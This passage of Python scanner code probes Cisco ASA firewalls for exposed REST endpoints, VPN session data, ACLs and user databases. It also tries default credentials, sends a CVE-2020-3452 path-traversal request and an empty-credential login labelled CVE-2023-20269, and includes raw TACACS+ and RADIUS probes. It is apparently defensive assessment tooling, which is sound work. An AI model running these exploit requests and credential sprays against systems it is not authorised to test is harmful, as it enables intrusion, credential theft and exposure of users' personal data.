    # ── Probe 3: network objects (CRITICAL — subnet topology) ─────────────────
    sc3, body3, _ = _do_get('/api/objects/networkobjects')
    if sc3 == 200 and len(body3) > 0:
        obj_count = max(body3.count('"objectId"'), body3.count('"name"'), body3.count('{'))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_REST_NET_OBJECTS_UNAUTH — network object database exposed without authentication',
            'detail': (
                f'ASA REST API /api/objects/networkobjects at {host}:{port} returned '
                f'HTTP 200 ({len(body3)} bytes) without authentication.  '
                f'Response contains approximately {obj_count} network object entries.  '
                f'Network objects define the named IP host/subnet references used in '
                f'ACLs, NAT rules, and VPN split-tunnel policies (ch08 ACL chapter: '
                f'objects referenced by ACE source/destination fields).  '
                f'Disclosure maps the full internal addressing scheme — segment names, '
                f'subnet boundaries, host addresses — without any CLI or ASDM access.  '
                f'Sufficient for lateral-movement path planning and NAT bypass targeting.  '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 4: live AnyConnect VPN sessions (CRITICAL — active user PII) ────
    sc4, body4, _ = _do_get('/api/vpn/sessiondb/anyconnect')
    if sc4 == 200 and len(body4) > 0:
        session_count = max(body4.count('"username"'), body4.count('"publicIp"'), body4.count('{'))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_REST_VPN_SESSIONS_UNAUTH — live AnyConnect session table exposed (PII)',
            'detail': (
                f'ASA REST API /api/vpn/sessiondb/anyconnect at {host}:{port} returned '
                f'HTTP 200 ({len(body4)} bytes) without authentication.  '
                f'Approximately {session_count} active session entries detected.  '
                f'Each entry contains: username, public IP, private IP assigned, '
                f'session duration, bytes transferred, encryption cipher, and login time.  '
                f'ch22 (Clientless SSL VPN) and ch19 (AnyConnect): the session database '
                f'is the authoritative record of all active remote-access VPN users.  '
                f'Disclosure constitutes a PII breach (real names + home IPs) and '
                f'enables targeted session-hijacking via cookie theft or lateral '
                f'movement against connected endpoints.  '
                f'Body excerpt: {body4[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 5: physical interface configuration ─────────────────────────────
    sc5, body5, _ = _do_get('/api/interfaces/physical')
    if sc5 == 200 and len(body5) > 0:
        iface_count = max(body5.count('"nameif"'), body5.count('"ipAddress"'), body5.count('{'))
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_REST_INTERFACES_UNAUTH — physical interface config exposed without authentication',
            'detail': (
                f'ASA REST API /api/interfaces/physical at {host}:{port} returned '
                f'HTTP 200 ({len(body5)} bytes) without authentication.  '
                f'Approximately {iface_count} interface entries detected.  '
                f'Disclosed attributes include nameif (inside/outside/DMZ), security '
                f'levels (0-100), IP addresses, subnet masks, and shutdown state.  '
                f'Security-level topology directly maps the trust hierarchy (ch04: '
                f'higher level = more trusted); combined with network objects this '
                f'reconstructs the full segmentation architecture without CLI access.  '
                f'Body excerpt: {body5[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 6: global ACL rules (CRITICAL — full policy map) ────────────────
    sc6, body6, _ = _do_get('/api/access/global/rules')
    if sc6 == 200 and len(body6) > 0:
        rule_count = max(body6.count('"permit"'), body6.count('"deny"'),
                         body6.count('"ruleId"'), body6.count('{'))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_REST_ACL_RULES_UNAUTH — global ACL ruleset exposed without authentication',
            'detail': (
                f'ASA REST API /api/access/global/rules at {host}:{port} returned '
                f'HTTP 200 ({len(body6)} bytes) without authentication.  '
                f'Approximately {rule_count} ACE entries detected.  '
                f'ch08: ACLs control all through-the-box and to-the-box traffic '
                f'filtering; global rules apply to all interfaces simultaneously.  '
                f'Disclosure reveals every permit/deny entry including source/dest '
                f'addresses, port ranges, protocol, and hit counts — a complete map '
                f'of allowed traffic paths and policy gaps.  Permits with broad '
                f'source/dest (any-any) or high-value destination ports are '
                f'immediately actionable as bypass vectors.  '
                f'Body excerpt: {body6[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 7: local user database (CRITICAL — credential enumeration) ──────
    sc7, body7, _ = _do_get('/api/objects/localusers')
    if sc7 == 200 and len(body7) > 0:
        user_count = max(body7.count('"userName"'), body7.count('"username"'),
                         body7.count('"privilege"'), body7.count('{'))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_REST_LOCAL_USERS_UNAUTH — local user database exposed without authentication',
            'detail': (
                f'ASA REST API /api/objects/localusers at {host}:{port} returned '
                f'HTTP 200 ({len(body7)} bytes) without authentication.  '
                f'Approximately {user_count} user entries detected.  '
                f'Disclosed attributes include: username, privilege level (0-15), '
                f'and optionally password hash or nopassword flag.  '
                f'ch04: privilege 15 = full configuration access (equivalent to '
                f'enable mode); local users bypass AAA when fallback is configured.  '
                f'Username enumeration enables targeted credential attacks; '
                f'privilege-level disclosure maps the admin account landscape.  '
                f'Body excerpt: {body7[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 8: default credential spray via HTTP Basic auth ─────────────────
    default_creds = [('admin', 'cisco'), ('admin', 'admin'), ('admin', '')]
    for username, password in default_creds:
        cred = base64.b64encode(f'{username}:{password}'.encode()).decode()
        sc8, body8, hdrs8 = _do_get(
            '/api/monitoring/serialno',
            extra_headers={'Authorization': f'Basic {cred}'}
        )
        if sc8 == 200 and len(body8) > 0:
            # Confirm not the same unauthenticated response we already got
            findings.append({
                'severity': 'CRITICAL',
                'title': f'ASA_REST_DEFAULT_CREDS — REST API accessible with default credential {username}:{password!r}',
                'detail': (
                    f'ASA REST API at {host}:{port} accepted HTTP Basic auth with '
                    f'username={username!r} password={password!r}.  '
                    f'Credential trial against /api/monitoring/serialno returned '
                    f'HTTP 200 ({len(body8)} bytes).  '
                    f'ch04: ASDM/REST API access uses the enable password as fallback '
                    f'when no explicit AAA is configured; default enable password is '
                    f'blank (press Enter) on factory-default ASA — the same credential '
                    f'tested here.  Full REST API access with these credentials grants '
                    f'unauthenticated write access to ACLs, NAT, routing, and VPN '
                    f'configuration — equivalent to privileged EXEC mode.  '
                    f'Body excerpt: {body8[:200]}'
                ),
                'host': host,
                'port': port,
            })
            break  # one confirmed cred is sufficient

    # ── Probe 9: version disclosure via response headers ──────────────────────
    # Try any endpoint that might return X-Hw-Version or version in body
    sc9, body9, hdrs9 = _do_get('/api/monitoring/serialno')
    if sc9 is not None:
        version = ''
        for hdr_name in ('X-Hw-Version', 'x-hw-version', 'Server', 'server',
                          'X-Asa-Version', 'x-asa-version'):
            if hdr_name in hdrs9:
                version = hdrs9[hdr_name]
                break
        if not version:
            m = re.search(r'(?i)(?:version|asa)[:\s"]+(\d+\.\d+[\.\d]*)', body9)
            if m:
                version = m.group(1)
        if version:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ASA_VERSION_DISCLOSED — software version leaked via REST API response',
                'detail': (
                    f'ASA REST API at {host}:{port} disclosed software version '
                    f'{version!r} in response headers or body.  '
                    f'ch04 show version: the ASA software version determines which '
                    f'CVEs are applicable; version disclosure enables targeted exploit '
                    f'selection without requiring CLI access.  '
                    f'Header/body source; version string: {version!r}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_smart_licensing_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect ASA Smart Licensing, Call Home, and WebVPN attack surface exposure.

    Synthesized from: Chapter 4 (Managing Licenses, Smart Call Home), Chapter 22
    (Clientless SSL VPN), Chapter 3 (Licensing) — Cisco ASA All-in-One NGFW, 3e.

    Cisco ASA uses Smart Licensing (and legacy PAK/activation-key licensing) for
    feature entitlement.  Smart Licensing communicates with Cisco CSSM (Smart
    Software Manager) over HTTPS port 443 outbound, and optionally via Smart Call
    Home (call-home profile to tools.cisco.com).  The management plane also exposes
    the WebVPN portal at /+CSCOE+/ and the ASDM REST API at /admin/.

    Attack surface detected:
      /+CSCOE+/logon.html          — WebVPN portal presence + version banner
      /admin/license               — license info disclosure via ASDM web handler
      /api/licensing/smartlicensing/registration  — Smart Licensing registration status
      TCP 6001/6002/6003           — Cisco Smart Call Home data exfil channel
      CVE-2020-3452                — path traversal in WebVPN (CVSS 7.5)
      CVE-2023-20269               — auth bypass in SSL VPN (CVSS 9.8)

    All HTTPS probes use ssl.CERT_NONE / check_hostname=False.
    Call Home port checks use raw socket connect.
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _do_get(path, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {'Accept': 'text/html,application/json,*/*', 'User-Agent': 'Mozilla/5.0'}
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    # ── Probe 1: WebVPN portal fingerprint ────────────────────────────────────
    sc1, body1, _ = _do_get('/+CSCOE+/logon.html')
    if sc1 in (200, 302) and (
        'cisco adaptive security' in body1.lower()
        or 'csco_cvpn' in body1.lower()
        or 'webvpn' in body1.lower()
        or '+CSCOE+' in body1
        or 'logon_form' in body1.lower()
    ):
        # Extract version from HTML if present
        ver_html = ''
        m = re.search(r'(?i)Cisco\s+Adaptive\s+Security\s+Appliance.*?(\d+\.\d+[\.\d]*)', body1)
        if m:
            ver_html = m.group(1)
        ver_html_label = repr(ver_html) if ver_html else '"not found"'
        findings.append({
            'severity': 'INFO',
            'title': 'ASA_WEBVPN_PORTAL — Cisco ASA WebVPN portal detected',
            'detail': (
                f'WebVPN logon portal at {host}:{port}/+CSCOE+/logon.html returned '
                f'HTTP {sc1} with ASA-identifying content.  '
                f'ch22 (Clientless SSL VPN): the /+CSCOE+/ namespace is the Cisco '
                f'WebVPN handler; its presence confirms an ASA with SSL VPN enabled.  '
                f'Version extracted from HTML: {ver_html_label}.  '
                f'Portal exposure is the prerequisite for CVE-2020-3452 path traversal '
                f'and CVE-2023-20269 auth bypass (both tested below).  '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 2: license info disclosure via ASDM web handler ────────────────
    sc2, body2, _ = _do_get('/admin/license')
    if sc2 == 200 and len(body2) > 0 and (
        'license' in body2.lower()
        or 'activation' in body2.lower()
        or 'entitlement' in body2.lower()
        or 'smart' in body2.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_LICENSE_INFO — license information disclosed via unauthenticated /admin/license',
            'detail': (
                f'ASDM web handler /admin/license at {host}:{port} returned '
                f'HTTP 200 ({len(body2)} bytes) without authentication.  '
                f'ch04 (Managing Licenses): the activation key and license features '
                f'are administrative data; disclosure reveals which optional feature '
                f'sets are licensed (e.g., AnyConnect Premium, IPS, Botnet), enabling '
                f'targeted attacks against licensed-but-possibly-misconfigured features.  '
                f'License serial number or activation key in response enables Smart '
                f'Licensing impersonation against CSSM.  '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 3: Call Home port reachability (TCP 6001/6002/6003) ─────────────
    callhome_ports = [6001, 6002, 6003]
    open_callhome = []
    for ch_port in callhome_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(min(timeout, 3.0))
            result = s.connect_ex((host, ch_port))
            s.close()
            if result == 0:
                open_callhome.append(ch_port)
        except Exception:
            pass
    if open_callhome:
        findings.append({
            'severity': 'MEDIUM',
            'title': f'ASA_CALLHOME_PORT — Cisco Smart Call Home port(s) reachable: {open_callhome}',
            'detail': (
                f'TCP port(s) {open_callhome} on {host} accepted connection.  '
                f'ch04 (Smart Call Home): Cisco ASA uses Call Home profiles to '
                f'transmit diagnostic and health telemetry to tools.cisco.com; '
                f'Call Home port 6001 is the primary channel, 6002/6003 are '
                f'alternate/secure variants.  Reachability from the probe host '
                f'indicates the Call Home channel is exposed beyond its intended '
                f'outbound-only path.  An attacker positioned between the ASA and '
                f'CSSM can intercept Call Home payloads (device model, serial, '
                f'configuration fragments) or inject poisoned responses affecting '
                f'license entitlement decisions.  '
                f'Open ports: {open_callhome}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 4: Smart Licensing registration status ───────────────────────────
    sc4, body4, _ = _do_get('/api/licensing/smartlicensing/registration')
    if sc4 == 200 and len(body4) > 0:
        reg_status = ''
        try:
            d = json.loads(body4)
            reg_status = d.get('registrationStatus', d.get('status', ''))
        except Exception:
            m = re.search(r'(?i)"?status"?\s*:\s*"([^"]+)"', body4)
            if m:
                reg_status = m.group(1)
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_SMARTLICENSE_STATUS — Smart Licensing registration status exposed without authentication',
            'detail': (
                f'ASA REST API /api/licensing/smartlicensing/registration at '
                f'{host}:{port} returned HTTP 200 ({len(body4)} bytes) without '
                f'authentication.  Registration status: {reg_status!r}.  '
                f'ch04: Smart Licensing registration binds the device serial to a '
                f'CSSM virtual account; the registration token is a secret that '
                f'authorizes feature entitlement.  Disclosure of registration status '
                f'(REGISTERED/UNREGISTERED/OUT_OF_COMPLIANCE) reveals the licensing '
                f'posture — an UNREGISTERED or OUT_OF_COMPLIANCE device may have '
                f'degraded security feature enforcement.  Registration ID Token '
                f'in the response body constitutes a critical credential.  '
                f'Body excerpt: {body4[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 5: CVE-2020-3452 WebVPN path traversal ─────────────────────────
    traversal_path = (
        '/+CSCOT+/translation-table?type=mst'
        '&textdomain=/%2bCSCOE%2b/portal_inc.lua'
        '&default-language&lang=../'
    )
    sc5, body5, _ = _do_get(traversal_path)
    if sc5 == 200 and (
        'cisco' in body5.lower()
        or 'portal' in body5.lower()
        or 'webvpn' in body5.lower()
        or len(body5) > 100
    ):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_CVE_2020_3452_TRAVERSAL — WebVPN path traversal (CVE-2020-3452) confirmed',
            'detail': (
                f'CVE-2020-3452 path traversal at {host}:{port}{traversal_path} '
                f'returned HTTP 200 ({len(body5)} bytes) with Cisco-identifying content.  '
                f'CVE-2020-3452 (CVSS 7.5): the /+CSCOT+/translation-table endpoint '
                f'in ASA WebVPN fails to sanitize the lang parameter, allowing '
                f'directory traversal to read arbitrary files from the ASA flash '
                f'filesystem accessible to the WebVPN process — including '
                f'portal_inc.lua, WebVPN customization files, and potentially '
                f'cached configuration fragments.  '
                f'Affected: ASA 9.6 through 9.14; patched in 9.14(2.10), 9.13(1.21).  '
                f'Confirmed via non-empty 200 response to traversal URI.  '
                f'Body excerpt: {body5[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 6: CVE-2023-20269 SSL VPN auth bypass ───────────────────────────
    # Test logon endpoint with empty/null user — a bypass allows session without creds
    sc6_a, body6_a, hdrs6_a = _do_get('/+CSCOE+/logon.html')
    if sc6_a == 200:
        # Post-logon check: submit empty credentials and check if portal is returned
        login_url = f'{base}/+webvpn+/index.html'
        post_data = urllib.parse.urlencode({
            'username': '',
            'password': '',
            'Login': 'Login',
        }).encode()
        login_req = urllib.request.Request(
            login_url,
            data=post_data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,*/*',
                'User-Agent': 'Mozilla/5.0',
            },
            method='POST',
        )
        try:
            with urllib.request.urlopen(login_req, timeout=timeout, context=ctx) as r6:
                body6 = r6.read().decode('utf-8', errors='replace')
                sc6 = r6.status
        except urllib.error.HTTPError as e6:
            sc6 = e6.code
            try:
                body6 = e6.read().decode('utf-8', errors='replace')
            except Exception:
                body6 = ''
        except Exception:
            sc6 = None
            body6 = ''

        if sc6 == 200 and (
            'portal' in body6.lower()
            or 'csco_cvpn' in body6.lower()
            or 'webvpn' in body6.lower()
        ) and 'logon' not in body6.lower()[:500]:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_SSL_VPN_AUTH_BYPASS — SSL VPN authentication bypass (CVE-2023-20269) confirmed',
                'detail': (
                    f'CVE-2023-20269 auth bypass at {host}:{port}: POST to '
                    f'/+webvpn+/index.html with empty credentials returned '
                    f'HTTP {sc6} with portal-indicating content (no logon redirect).  '
                    f'CVE-2023-20269 (CVSS 9.8): a flaw in the RAVPN authentication '
                    f'and authorization components of ASA allows an unauthenticated '
                    f'remote attacker to conduct a brute-force attack to identify '
                    f'valid username/password combinations or establish a clientless '
                    f'SSL VPN session without credentials.  '
                    f'Affected: ASA 9.16 and earlier with SSL VPN enabled.  '
                    f'ch22: clientless sessions bypass the full authentication state '
                    f'machine when the bypass is present.  '
                    f'Body excerpt: {body6[:400]}'
                ),
                'host': host,
                'port': port,
            })

    # ── Probe 7: version extraction from any HTML response ────────────────────
    version_html = ''
    for sc_v, body_v, _ in [(sc1, body1, None)]:
        if body_v:
            m = re.search(
                r'(?i)(?:cisco\s+asa|adaptive\s+security)[^\d]*(\d+\.\d+[\.\d()\w]*)',
                body_v,
            )
            if m:
                version_html = m.group(1)
                break
            m2 = re.search(r'Version\s+(\d+\.\d+[\.\d]*)', body_v)
            if m2:
                version_html = m2.group(1)
                break
    if version_html:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_VERSION_IN_HTML — ASA software version disclosed in WebVPN portal HTML',
            'detail': (
                f'ASA software version {version_html!r} extracted from HTML at '
                f'{host}:{port}/+CSCOE+/logon.html.  '
                f'ch04 show version: the ASA software version is the primary CVE '
                f'scoping key; HTML banner disclosure enables version fingerprinting '
                f'without CLI or authenticated API access.  Affected version string '
                f'maps directly to applicable CVE advisories (NVD search: '
                f'"cisco asa {version_html}").  '
                f'Remove or suppress version strings from WebVPN portal templates '
                f'via customization (ch22 portal customization).  '
                f'Version: {version_html!r}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_privilege_escalation_surface(host, port=443, timeout=10.0):
    """Detect Cisco ASA privilege escalation and AAA authentication bypass surfaces.

    Synthesized from: Chapter 7 (Authentication, Authorization, and Accounting),
    Chapter 4 (Initial Setup, Enable Password, Privilege Levels) — Cisco ASA
    All-in-One NGFW Firewall, IPS, and VPN Services, 3rd Edition.

    ch07: ASA supports local, RADIUS, and TACACS+ authentication for admin sessions
    (Telnet, SSH, ASDM, enable mode).  TACACS+ uses TCP port 49; RADIUS uses UDP
    1812/1645.  The enable password governs access to privilege level 15 — the
    highest administrative level.  The ASA REST API (port 443 or 55443) exposes AAA
    configuration at /api/aaa/*.  Identity Firewall (IDFW) integrates with Active
    Directory via /api/ad/domain.  Local users and their privilege levels are
    accessible at /api/aaa/authentication/localusers when the REST API is unprotected.
    SSL certificate mappings used for certificate-based auth surface at /api/ssl/.

    Attack surface probed:
      /api/aaa/authentication              — REST AAA config (admin:enable attempt)
      /api/aaa/authorization/commands      — command-authorization surface (POST empty)
      /api/aaa/authentication/localusers   — local user database unauth read
      /api/ad/domain                       — Identity Firewall AD integration
      /api/ssl/certificates                — certificate-based auth chains
      TCP 49 / TACACS+ authen-start packet — TACACS+ daemon responsiveness
      UDP 1812/1645                        — RADIUS port reachability
      Any accessible config endpoint       — enable password string grep

    All HTTPS probes use ssl.CERT_NONE / check_hostname=False.
    Raw socket probes use socket.SOCK_STREAM (TCP) or SOCK_DGRAM (UDP).
    """
    import random
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _do_get(path, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {'Accept': 'application/json,text/html,*/*', 'User-Agent': 'Mozilla/5.0'}
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    def _do_post(path, post_body, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {
            'Accept': 'application/json,*/*',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
        }
        if extra_headers:
            hdrs.update(extra_headers)
        if isinstance(post_body, str):
            post_body = post_body.encode()
        req = urllib.request.Request(url, data=post_body, headers=hdrs, method='POST')
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    # ── Probe 1: enable password in any accessible config endpoint ────────────
    # ch07: enable password grants privilege level 15; exposure is CRITICAL
    sc1, body1, _ = _do_get('/api/running-config')
    if sc1 is None:
        sc1, body1, _ = _do_get('/api/cli/show/running-config')
    if sc1 == 200 and re.search(r'enable\s+password\s+\S+', body1, re.IGNORECASE):
        m = re.search(r'enable\s+password\s+(\S+)', body1, re.IGNORECASE)
        pw_hash = m.group(1) if m else '[redacted]'
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_ENABLE_PASSWORD_EXPOSED — enable password hash readable without authentication',
            'detail': (
                f'Running config at {host}:{port} returned HTTP {sc1} and contains '
                f'"enable password" entry.  Hash: {pw_hash[:32]!r}.  '
                f'ch07: the enable password governs entry into privilege level 15 '
                f'(full administrative mode).  Disclosure of the hash enables offline '
                f'cracking (MD5-based or type-7 XOR encoding — both trivially reversed).  '
                f'ch04: privilege level 15 allows all show/configure commands; '
                f'obtaining it is equivalent to full device compromise.'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 2: REST AAA endpoint (admin:enable) ─────────────────────────────
    # ch07: aaa authentication enable console → governs enable-mode auth
    import base64 as _b64
    _cred = _b64.b64encode(b'admin:enable').decode()
    sc2, body2, _ = _do_get(
        '/api/aaa/authentication',
        extra_headers={'Authorization': f'Basic {_cred}'},
    )
    if sc2 == 200 and len(body2) > 0 and (
        'authentication' in body2.lower()
        or 'aaa' in body2.lower()
        or 'localauth' in body2.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_REST_AAA_ENDPOINT — AAA authentication configuration accessible via REST API',
            'detail': (
                f'GET /api/aaa/authentication at {host}:{port} returned HTTP {sc2} '
                f'({len(body2)} bytes) with AAA-identifying content.  '
                f'ch07: the ASA REST API mirrors the CLI aaa authentication commands; '
                f'read access reveals which console/SSH/Telnet/enable paths use LOCAL '
                f'vs RADIUS vs TACACS+, enabling targeted auth-bypass selection.  '
                f'ch07: if LOCAL fallback is enabled and the primary server is '
                f'unreachable, default credentials may be accepted.  '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 3a: TACACS+ port open (TCP 49) ─────────────────────────────────
    # ch07: TACACS+ uses TCP port 49; ASA is the NAS client
    tacacs_open = False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(min(timeout, 3.0))
        if s.connect_ex((host, 49)) == 0:
            tacacs_open = True
        s.close()
    except Exception:
        pass

    if tacacs_open:
        findings.append({
            'severity': 'HIGH',
            'title': 'TACACS_PORT_OPEN — TACACS+ daemon reachable on TCP/49',
            'detail': (
                f'TCP port 49 on {host} accepted a connection.  '
                f'ch07: TACACS+ uses TCP port 49 for all AAA communication; '
                f'Cisco ASA acts as the NAS and communicates with the TACACS+ '
                f'server using a shared secret.  Reachability from the probe host '
                f'indicates the TACACS+ daemon is network-exposed.  '
                f'Allows brute-force of the shared secret (MD5-obfuscated body, '
                f'not encrypted — vulnerable to MITM replay attacks on older '
                f'implementations).  Tested below with authen-start packet.'
            ),
            'host': host,
            'port': 49,
        })

        # ── Probe 3b: TACACS+ authen-start packet ─────────────────────────────
        # ch07: TACACS+ authen-start = header(ver=0xc1, type=0x01, seq=0x01,
        # flags=0x00) + session_id(4B random) + length(4B) + body
        # Minimal body: action=LOGIN(0x01), priv_lvl=0x01, authen_type=ASCII(0x01),
        # service=LOGIN(0x01), user_len=0, port_len=0, rem_addr_len=0, data_len=0
        tacacs_responsive = False
        try:
            rand_session = random.randint(0, 0xFFFFFFFF).to_bytes(4, 'big')
            body_bytes = b'\x01\x01\x01\x01\x00\x00\x00\x00'
            pkt = b'\xc1\x01\x01\x00' + rand_session + len(body_bytes).to_bytes(4, 'big') + body_bytes
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(min(timeout, 3.0))
            s2.connect((host, 49))
            s2.sendall(pkt)
            resp = s2.recv(64)
            s2.close()
            # A valid TACACS+ response header starts with 0xc1 and has type 0x02 (AUTHEN-REPLY)
            if len(resp) >= 8 and resp[0] == 0xc1 and resp[1] == 0x02:
                tacacs_responsive = True
        except Exception:
            pass

        if tacacs_responsive:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'TACACS_AUTHEN_RESPONSIVE — TACACS+ daemon responded to authen-start packet',
                'detail': (
                    f'TACACS+ daemon on {host}:49 responded to a well-formed '
                    f'authen-start packet (version=0xc1, type=AUTHENTICATION, '
                    f'seq=1) with a type-2 AUTHEN-REPLY header.  '
                    f'ch07: TACACS+ separates authentication, authorization, and '
                    f'accounting into distinct exchanges — a responsive authen daemon '
                    f'can be brute-forced for the shared secret (the body is '
                    f'XOR-obfuscated with MD5(secret+session_id+seq)).  '
                    f'Shared-secret recovery allows decryption of all recorded '
                    f'TACACS+ sessions and enables privilege escalation via forged '
                    f'authorization responses (privilege level 15 grant).  '
                    f'Unencrypted channel: TACACS+ does not use TLS by default; '
                    f'full packet capture exposes username/password.'
                ),
                'host': host,
                'port': 49,
            })

    # ── Probe 4: RADIUS port reachability (UDP 1812 / legacy 1645) ───────────
    # ch07: RADIUS uses UDP 1812 (auth) and 1813 (acct); legacy ports 1645/1646
    for radius_port in (1812, 1645):
        try:
            s3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s3.settimeout(min(timeout, 2.0))
            # Send a minimal RADIUS Access-Request (code=1, id=1, length=20,
            # authenticator=16 zero bytes) — no attributes, will get Access-Reject
            # or ICMP-unreachable if nothing is listening
            radius_pkt = b'\x01\x01\x00\x14' + b'\x00' * 16
            s3.sendto(radius_pkt, (host, radius_port))
            try:
                data, _ = s3.recvfrom(512)
                s3.close()
                # Any UDP response (Access-Accept=2, Access-Reject=3, Access-Challenge=11)
                # confirms a RADIUS server is present
                if len(data) >= 4 and data[0] in (2, 3, 11):
                    findings.append({
                        'severity': 'HIGH',
                        'title': f'RADIUS_PORT_OPEN — RADIUS server responded on UDP/{radius_port}',
                        'detail': (
                            f'RADIUS server on {host}:{radius_port} responded to a '
                            f'minimal Access-Request with code={data[0]} '
                            f'(2=Accept, 3=Reject, 11=Challenge).  '
                            f'ch07: RADIUS combines authentication and authorization; '
                            f'response code {data[0]} confirms an active RADIUS '
                            f'daemon.  The ASA shared secret is MD5-based and '
                            f'vulnerable to offline dictionary attacks when the '
                            f'Access-Request/Response pair is captured; the '
                            f'authenticator field provides the known plaintext.  '
                            f'ch07: if the ASA falls back to LOCAL on RADIUS failure, '
                            f'DoS of the RADIUS server forces local-auth fallback.'
                        ),
                        'host': host,
                        'port': radius_port,
                    })
                else:
                    findings.append({
                        'severity': 'HIGH',
                        'title': f'RADIUS_PORT_OPEN — RADIUS port UDP/{radius_port} reachable (response code {data[0] if data else "none"})',
                        'detail': (
                            f'UDP port {radius_port} on {host} returned a datagram '
                            f'in response to a RADIUS Access-Request probe.  '
                            f'ch07: RADIUS is the ASA\'s primary external auth backend; '
                            f'port reachability confirms the authentication path '
                            f'is network-accessible for attack.'
                        ),
                        'host': host,
                        'port': radius_port,
                    })
            except socket.timeout:
                s3.close()
                # Timeout = no response; could be no server or firewall drop
        except Exception:
            pass

    # ── Probe 5: AAA command authorization surface ────────────────────────────
    # ch07: aaa authorization command <group> LOCAL → command-level authorization
    sc5, body5, _ = _do_post(
        '/api/aaa/authorization/commands',
        json.dumps({'username': '', 'privilege': 15, 'command': 'show version'}),
    )
    if sc5 == 200 and len(body5) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_AAA_COMMAND_SURFACE — AAA command authorization endpoint accessible',
            'detail': (
                f'POST /api/aaa/authorization/commands at {host}:{port} returned '
                f'HTTP {sc5} ({len(body5)} bytes) with empty username.  '
                f'ch07: command authorization controls which privilege-level commands '
                f'are permitted per user; an unauthenticated or weakly authenticated '
                f'authorization endpoint allows privilege enumeration and potential '
                f'command injection via the authorization decision path.  '
                f'Body excerpt: {body5[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 6: Identity Firewall AD domain endpoint ─────────────────────────
    # ch07 / IDFW: ASA IDFW integrates with AD; domain info discloses internal topology
    sc6, body6, _ = _do_get('/api/ad/domain')
    if sc6 == 200 and len(body6) > 0 and (
        'domain' in body6.lower()
        or 'active' in body6.lower()
        or 'ldap' in body6.lower()
        or 'dc=' in body6.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_IDFW_DOMAIN_EXPOSED — Identity Firewall Active Directory domain info disclosed',
            'detail': (
                f'GET /api/ad/domain at {host}:{port} returned HTTP {sc6} '
                f'({len(body6)} bytes) containing AD-identifying content.  '
                f'ch07: ASA Identity Firewall maps user identities to IP addresses '
                f'via AD agent queries; domain name and DC addresses in the response '
                f'disclose internal Active Directory topology, enabling targeted '
                f'Kerberoasting, AS-REP roasting, or LDAP enumeration against the '
                f'named domain controllers.  '
                f'Body excerpt: {body6[:300]}'
            ),
            'host': host,
            'port': port,
        })

